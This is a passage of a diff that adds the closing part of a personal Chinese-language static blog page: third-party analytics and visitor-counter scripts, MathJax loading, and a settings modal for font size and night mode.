+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+
+  
+<script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            忆 执 昔 来 的 旅 途
+          </div>
+          <div class="panel-body">
+            Copyright © 2021 xizhi-future All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
